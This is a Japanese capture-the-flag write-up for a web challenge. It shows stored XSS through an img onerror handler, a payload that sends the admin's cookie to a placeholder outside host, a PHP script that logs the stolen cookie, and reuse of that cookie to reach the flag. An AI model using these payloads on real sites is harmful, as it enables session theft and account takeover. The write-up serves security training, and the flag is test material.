# Xmas Still Stands:Web:50pts
You remember when I said I dropped clam's tables? Well that was on Xmas day. And because I ruined his Xmas, he created the [Anti Xmas Warriors](https://xmas.2020.chall.actf.co/) to try to ruin everybody's Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?  


# Solution
文字列をPostし、それを表示するWEBアプリケーションであるようだ。  
Home  
[site1.png](site/site1.png)  
Post  
[site2.png](site/site2.png)  
Report  
[site3.png](site/site3.png)  
Admin  
[site4.png](site/site4.png)  
さらに管理人にReportすることでそのPostを削除させることができる。  
AdminページよりXSSで管理人のcookieを盗めばよい。  
問題の頭文字もXSSである。  
```javascript
<script>alert("actf")</script>
```
をPostしてみるが、alertが表示されないのでonerrorを使用する。  
```javascript
<img src="1" onerror="alert('actf');">
```
無事alertが表示されたので、以下のようなスクリプトを仕込みAdminに削除させる。  
```javascript
<img src="1" onerror="location.href = 'http://www.xxxxx.xxx/hack.php?cookie=' + document.cookie;">
```
今回はphpを以下のように記述した(アクセスログを見るのもよい)。  
```php:hack.php
<?php
$URI = $_SERVER['REQUEST_URI'];
echo $URI;
$fp = fopen("hack.txt", "w");
fwrite($fp, $URI);
fclose($fp);
?>
```
表示されたPostのIDをReportの後、hack.txtに以下のcookieが保存されていた。  
```text:hack.txt
/hack.php?cookie=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=John
```
これを自身のブラウザに設定してやる。  
```javascript
<img src="1" onerror="document.cookie = 'super_secret_admin_cookie=hello_yes_i_am_admin; path=/';">
<img src="1" onerror="document.cookie = 'admin_name=John; path=/';">
```
せっかくXSSがあるならば使おう。  
するとAdminページにflagが表示される。  
Admin_flag  
[flag.png](site/flag.png)

## actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}